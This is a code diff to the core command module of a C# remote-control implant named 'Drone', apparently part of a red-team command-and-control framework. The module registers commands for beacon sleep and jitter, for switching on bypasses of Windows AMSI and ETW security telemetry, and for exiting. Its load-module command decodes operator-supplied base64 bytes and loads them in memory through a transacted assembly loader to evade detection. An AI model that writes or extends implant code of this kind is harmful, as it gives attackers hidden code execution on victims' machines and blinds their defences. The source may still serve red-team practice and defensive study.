@@ -1,5 +1,5 @@
 ﻿using System;
-using System.Reflection;
+using System.Collections.Generic;
 using System.Threading;
 
 using Drone.Models;
@@ -8,31 +8,26 @@ namespace Drone.Modules
 {
     public class CoreModule : DroneModule
     {
-        public override string Name { get; } = "core";
-        
-        public override void AddCommands()
+        public override string Name => "core";
+
+        public override List<Command> Commands => new List<Command>
         {
-            var sleep = new Command("sleep", "Set sleep interval and jitter", SetSleep);
-            sleep.Arguments.Add(new Command.Argument("interval", false));
-            sleep.Arguments.Add(new Command.Argument("jitter"));
-
-            var exit = new Command("exit", "Exit this Drone", ExitDrone);
-
-            var amsi = new Command("bypass-amsi", "Bypass AMSI for post-ex tasks", BypassAmsi);
-            amsi.Arguments.Add(new Command.Argument("true/false"));
-
-            var etw = new Command("bypass-etw", "Bypass etw for post-ex tasks", BypassEtw);
-            etw.Arguments.Add(new Command.Argument("true/false"));
-
-            var load = new Command("load-module", "Load an external Drone module", LoadModule);
-            load.Arguments.Add(new Command.Argument("/path/to/module.dll", false, true));
-
-            Commands.Add(sleep);
-            Commands.Add(load);
-            Commands.Add(amsi);
-            Commands.Add(etw);
-            Commands.Add(exit);
-        }
+            new ("sleep", "Set sleep interval and jitter", SetSleep, new List<Command.Argument>
+            {
+                new ("interval", false),
+                new ("jitter")
+            }),
+            new ("load-module", "Load an external Drone module", LoadModule, new List<Command.Argument>
+            {
+                new ("/path/to/module.dll", false, true)
+            }),
+            new ("bypass", "Set a directive to bypass AMSI/ETW on tasks", SetBypass, new List<Command.Argument>
+            {
+                new("amsi/etw", false),
+                new("true/false")
+            }),
+            new ("exit", "Exit this Drone", ExitDrone)
+        };
 
         private void SetSleep(DroneTask task, CancellationToken token)
         {
@@ -42,37 +37,51 @@ namespace Drone.Modules
                 Config.SetConfig("SleepJitter", Convert.ToInt32(task.Arguments[1]));
         }
 
-        private void BypassAmsi(DroneTask task, CancellationToken token)
+        private void LoadModule(DroneTask task, CancellationToken token)
         {
-            if (task.Arguments.Length > 0)
-                Config.SetConfig("BypassAmsi", bool.Parse(task.Arguments[0]));
+            var bytes = Convert.FromBase64String(task.Artefact);
+            var transact = new TransactedAssembly();
+            var asm = transact.Load(bytes);
             
-            var current = Config.GetConfig<bool>("BypassAmsi");
-            Drone.SendResult(task.TaskGuid, current.ToString());
+            Drone.LoadDroneModule(asm);
         }
 
-        private void BypassEtw(DroneTask task, CancellationToken token)
+        private void SetBypass(DroneTask task, CancellationToken token)
         {
-            if (task.Arguments.Length > 0)
-                Config.SetConfig("BypassEtw", bool.Parse(task.Arguments[0]));
+            var config = "";
 
-            var current = Config.GetConfig<bool>("BypassEtw");
-            Drone.SendResult(task.TaskGuid, current.ToString());
+            if (task.Arguments[0].Equals("amsi", StringComparison.OrdinalIgnoreCase))
+                config = "BypassAmsi";
+
+            if (task.Arguments[0].Equals("etw", StringComparison.OrdinalIgnoreCase))
+                config = "BypassEtw";
+
+            if (string.IsNullOrEmpty(config))
+            {
+                Drone.SendError(task.TaskGuid, "Not a valid configuration option");
+                return;
+            }
+
+            var current = Config.GetConfig<bool>(config);
+
+            if (task.Arguments.Length == 2)
+            {
+                if (!bool.TryParse(task.Arguments[1], out var enabled))
+                {
+                    Drone.SendError(task.TaskGuid, $"{task.Arguments[1]} is not a value bool");
+                    return;
+                }
+
+                Config.SetConfig(config, enabled);
+                current = Config.GetConfig<bool>(config);
+            }
+
+            Drone.SendResult(task.TaskGuid, $"{config} is {current}");
         }
-
 
         private void ExitDrone(DroneTask task, CancellationToken token)
         {
             Drone.Stop();
-        }
-        
-        private void LoadModule(DroneTask task, CancellationToken token)
-        {
-            var bytes = Convert.FromBase64String(task.Artefact);
-            var asm = Assembly.Load(bytes);
-            
-            Drone.LoadDroneModule(asm);
-            Drone.SendResult(task.TaskGuid, $"Module {asm.GetName().Name} loaded.");
         }
     }
 }
